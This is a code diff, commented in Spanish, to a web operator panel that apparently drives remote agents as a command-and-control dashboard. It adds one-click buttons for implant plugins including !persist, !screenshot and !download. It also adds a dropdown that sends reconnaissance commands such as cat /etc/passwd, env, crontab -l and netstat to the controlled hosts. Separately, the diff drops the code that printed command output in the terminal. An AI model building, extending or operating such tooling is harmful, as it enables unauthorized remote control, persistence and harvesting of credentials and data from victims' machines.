@@ -81,6 +81,18 @@ tr.selected td{background:#071a07;border-left:2px solid #00ff41}
 .toast{position:fixed;bottom:30px;right:20px;background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:8px 14px;font-size:.75em;border-radius:3px;opacity:0;transition:opacity .3s;pointer-events:none}
 .toast.show{opacity:1}
 .statusbar{background:#0a0a0a;border-top:1px solid #1a1a1a;padding:4px 16px;font-size:.68em;color:#333;display:flex;justify-content:space-between;flex-shrink:0}
+/* Quick-action plugin buttons */
+.plugin-bar{display:flex;gap:6px;padding:6px 10px;background:#0d0d0d;border-top:1px solid #1a1a1a;flex-wrap:wrap}
+.plugin-btn{background:#111;color:#00ff41;border:1px solid #1e3a1e;padding:3px 10px;font-family:'Courier New',monospace;font-size:.72em;cursor:pointer;border-radius:2px;transition:background .15s,border-color .15s}
+.plugin-btn:hover{background:#1a2e1a;border-color:#00ff41}
+.plugin-btn:active{background:#00ff41;color:#000}
+.plugin-btn.needs-arg{color:#ffaa00;border-color:#3a2e00}
+.plugin-btn.needs-arg:hover{background:#2e2200;border-color:#ffaa00}
+/* Shell command dropdown */
+.cmd-row{display:flex;gap:6px;align-items:center;padding:6px 10px;background:#0d0d0d;border-top:1px solid #1a1a1a}
+.cmd-select{background:#111;color:#666;border:1px solid #222;padding:3px 6px;font-family:'Courier New',monospace;font-size:.72em;border-radius:2px;cursor:pointer;min-width:130px}
+.cmd-select:focus{outline:none;border-color:#444}
+.cmd-select option{background:#111;color:#aaa}
 </style>
 </head>
 <body>
@@ -111,6 +123,38 @@ tr.selected td{background:#071a07;border-left:2px solid #00ff41}
         </span>
       </div>
       <div class="term-body" id="term-body"></div>
+
+      <!-- Barra de plugins -->
+      <div class="plugin-bar" id="plugin-bar">
+        <button class="plugin-btn" onclick="runPlugin('!sysinfo')">!sysinfo</button>
+        <button class="plugin-btn" onclick="runPlugin('!screenshot')">!screenshot</button>
+        <button class="plugin-btn" onclick="runPlugin('!persist')">!persist</button>
+        <button class="plugin-btn" onclick="runPlugin('!help')">!help</button>
+        <button class="plugin-btn needs-arg" onclick="fillInput('!download ')">!download ···</button>
+      </div>
+
+      <!-- Fila de input con dropdown de comandos rápidos -->
+      <div class="cmd-row">
+        <select class="cmd-select" id="cmd-select" onchange="pickShell(this)">
+          <option value="">── shell rápido ──</option>
+          <option value="whoami">whoami</option>
+          <option value="id">id</option>
+          <option value="ps aux">ps aux</option>
+          <option value="ls -la">ls -la</option>
+          <option value="ls -la /tmp">ls -la /tmp</option>
+          <option value="cat /etc/passwd">cat /etc/passwd</option>
+          <option value="cat /etc/os-release">cat /etc/os-release</option>
+          <option value="ip a">ip a</option>
+          <option value="netstat -tlnp">netstat -tlnp</option>
+          <option value="ss -tlnp">ss -tlnp</option>
+          <option value="crontab -l">crontab -l</option>
+          <option value="env">env</option>
+          <option value="uname -a">uname -a</option>
+          <option value="df -h">df -h</option>
+          <option value="free -h">free -h</option>
+        </select>
+      </div>
+
       <div class="term-input-row">
         <span class="term-prompt" id="term-prompt">~$&nbsp;</span>
         <input id="term-input" type="text" autocomplete="off" spellcheck="false"/>
@@ -210,14 +254,10 @@ async function sendCmd(){
         const data=await res.json();
         const found=data.find(x=>x.task_id===waitTask);
         if(found||polls>24){
-          clearInterval(pid);waitTask=null;
-          if(found){
-            if(found.stdout&&found.stdout.trim())tprint(found.stdout.trimEnd(),'out');
-            if(found.stderr&&found.stderr.trim())tprint(found.stderr.trimEnd(),'err');
-            if(!found.stdout&&!found.stderr)tprint('[exit '+found.exit_code+']',found.exit_code===0?'sys':'err');
-          }else{tprint('Timeout — sin respuesta del agente','err');}
-          tinp.disabled=false;tinp.focus();
-          refreshResults();
+            clearInterval(pid);waitTask=null;
+            if(!found){tprint('Timeout — sin respuesta del agente','err');}
+            tinp.disabled=false;tinp.focus();
+            refreshResults();
         }
       }catch(e){}
     },2000);
@@ -266,6 +306,33 @@ async function refreshResults(){
         ${r.stderr?`<div class="r-err">${esc(r.stderr.trimEnd())}</div>`:''}
       </div>`).join('');
   }catch(e){}
+}
+
+// Ejecuta un plugin directamente (sin argumento extra)
+function runPlugin(cmd){
+  if(!sel||waitTask)return;
+  const tinp=document.getElementById('term-input');
+  tinp.value=cmd;
+  sendCmd();
+}
+
+// Pre-rellena el input para comandos que necesitan argumentos
+function fillInput(prefix){
+  if(!sel)return;
+  const tinp=document.getElementById('term-input');
+  tinp.value=prefix;
+  tinp.focus();
+  tinp.setSelectionRange(tinp.value.length,tinp.value.length);
+}
+
+// Selección del dropdown: mete el comando en el input y ejecuta
+function pickShell(sel_el){
+  const cmd=sel_el.value;
+  sel_el.value='';
+  if(!cmd||!sel||waitTask)return;
+  const tinp=document.getElementById('term-input');
+  tinp.value=cmd;
+  sendCmd();
 }
 
 refresh();
